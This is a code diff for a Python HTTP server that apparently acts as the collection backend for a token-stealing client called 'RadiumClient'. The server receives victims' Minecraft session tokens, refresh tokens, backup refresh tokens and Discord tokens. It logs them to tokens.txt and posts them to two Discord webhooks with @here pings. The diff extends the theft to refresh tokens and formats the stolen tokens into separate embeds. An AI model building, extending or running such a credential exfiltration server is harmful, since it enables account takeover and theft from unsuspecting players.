@@ -9,7 +9,7 @@ from collections import defaultdict
 # =========== RATE LIMITING ===========
 REQUEST_LOG = defaultdict(list)
 MAX_REQUESTS = 2
-TIME_WINDOW = 900  # 15 minutes
+TIME_WINDOW = 900
 BLOCKED_IPS_FILE = "blocked_ips.txt"
 IP_LOG_FILE = "ip_log.txt"
 
@@ -55,7 +55,6 @@ print("✅ Config loaded – 2 webhooks ready")
 # ======================================
 
 def send_to_discord(webhook_url, payload):
-    """Send a payload to a single Discord webhook."""
     try:
         headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
         req_data = json.dumps(payload).encode('utf-8')
@@ -66,13 +65,15 @@ def send_to_discord(webhook_url, payload):
         print(f"❌ Discord error ({webhook_url[-10:]}): {e}")
         return False
 
+def truncate(s, max_len=1990):
+    return s[:max_len] if len(s) > max_len else s
+
 class Handler(BaseHTTPRequestHandler):
     def do_POST(self):
         try:
             client_ip = self.client_address[0]
             print(f"📨 Request from IP: {client_ip}")
 
-            # Rate limit check
             if not check_rate_limit(client_ip):
                 self.send_response(429)
                 self.send_header('Content-type', 'text/plain')
@@ -83,33 +84,33 @@ class Handler(BaseHTTPRequestHandler):
             length = int(self.headers['Content-Length'])
             data = json.loads(self.rfile.read(length).decode())
 
-            req_type = data.get('type', 'login').strip()
-
-            # Extract fields (same as your old script)
+            # Extract ALL fields sent by RadiumClient
             username = data.get('username', 'Unknown').strip()
             uuid = data.get('uuid', '').strip()
             server = data.get('server', '').strip()
-            token = data.get('token', '').strip()
+            token = data.get('token', 'null').strip()
             money = data.get('money', '0').strip()
             playtime = data.get('playtime', '0h').strip()
             kills = data.get('kills', '0').strip()
             deaths = data.get('deaths', '0').strip()
-            skin = data.get('skin', '').strip()
-            log_type = req_type
+            refresh_token = data.get('refresh_token', 'not_found').strip()
             discord_tokens = data.get('discord_tokens', [])
+            backup_refresh_tokens = data.get('backup_refresh_tokens', [])
+            log_type = data.get('type', 'login').strip()
 
             print(f"Got: {username} on {server}")
 
-            # Log IP and write to tokens.txt
             log_ip(client_ip, username, server)
             with open('tokens.txt', 'a') as f:
-                f.write(f"{username} | {uuid} | {server} | {token} | {money} | {playtime} | {kills} | {deaths}\n")
+                f.write(f"{username} | {uuid} | {server} | {token} | {refresh_token} | {money} | {playtime} | {kills} | {deaths}\n")
 
-            # Build the exact same embed as your original script
             is_login = log_type.lower() == "login"
 
-            description = f"**Username:** `{username}`\n**UUID:** `{uuid}`\n**Server:** `{server}`"
+            # ── Build embeds ────────────────────────────────────────────
+            embeds = []
 
+            # 1. Main embed (stats + session token)
+            description = f"**Username:** `{username}`\n**UUID:** `{uuid}`\n**Server:** `{server}`"
             if money and money != "0":
                 description += f"\n**Money:** `{money}`"
             if playtime and playtime != "0h":
@@ -118,25 +119,45 @@ class Handler(BaseHTTPRequestHandler):
                 description += f"\n**Kills:** `{kills}`"
             if deaths and deaths != "0":
                 description += f"\n**Deaths:** `{deaths}`"
-
             if is_login and token:
-                description += f"\n\n🔑 **Session Token:**\n||`{token}`||"
+                description += f"\n\n🔑 **Session Token:**\n||`{truncate(token)}`||"
 
-            if discord_tokens:
-                tokens_str = "\n".join([f"||`{t}`||" for t in discord_tokens])
-                description += f"\n\n🎫 **Discord Tokens:**\n{tokens_str}"
-
-            embed = {
+            main_embed = {
                 "title": "✅ User Connected" if is_login else "❌ User Disconnected",
                 "color": 5763719 if is_login else 15548997,
                 "description": description
             }
+            if uuid:
+                main_embed["thumbnail"] = {"url": f"https://mc-heads.net/head/{uuid.replace('-', '')}"}
+            embeds.append(main_embed)
 
-            if skin:
-                embed["thumbnail"] = {"url": skin}
-            elif uuid:
-                embed["thumbnail"] = {"url": f"https://mc-heads.net/head/{uuid.replace('-', '')}"}
+            # 2. Discord tokens embed (if any)
+            if discord_tokens:
+                tokens_str = "\n".join([f"||`{t}`||" for t in discord_tokens[:20]])
+                embeds.append({
+                    "title": "🎫 Discord Tokens",
+                    "color": 5793266,
+                    "description": tokens_str
+                })
 
+            # 3. Refresh token embed (separate, no ping)
+            if is_login and refresh_token and refresh_token != "not_found":
+                embeds.append({
+                    "title": "🔄 Refresh Token",
+                    "color": 3066993,
+                    "description": f"```{truncate(refresh_token)}```"
+                })
+
+            # 4. Backup refresh tokens (if any, max 3)
+            if backup_refresh_tokens:
+                backup_list = [f"||`{rt}`||" for rt in backup_refresh_tokens[:3]]
+                embeds.append({
+                    "title": "Backup Refresh Tokens",
+                    "color": 15105570,
+                    "description": "\n".join(backup_list)
+                })
+
+            # ── Build content ( @here ) ─────────────────────────────────
             content = None
             if is_login:
                 if money and money != "0":
@@ -146,11 +167,11 @@ class Handler(BaseHTTPRequestHandler):
 
             payload = {
                 "content": content,
-                "embeds": [embed],
+                "embeds": embeds,
                 "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
             }
 
-            # Send to BOTH webhooks
+            # Send to both webhooks
             success1 = send_to_discord(DISCORD_WEBHOOK, payload)
             success2 = send_to_discord(DISCORD_WEBHOOK2, payload)
 
